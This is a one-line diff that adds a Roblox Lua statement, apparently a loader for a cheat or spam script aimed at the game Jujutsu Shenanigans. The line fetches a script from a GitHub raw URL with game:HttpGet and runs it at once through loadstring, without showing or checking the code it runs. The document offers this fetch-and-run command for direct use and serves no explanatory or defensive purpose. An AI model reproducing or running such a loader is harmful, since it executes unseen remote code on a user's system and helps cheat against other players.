@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/hired-killer-jujutsu-shenanigans-spam4-ra6xeky5n50w39.lua"))()
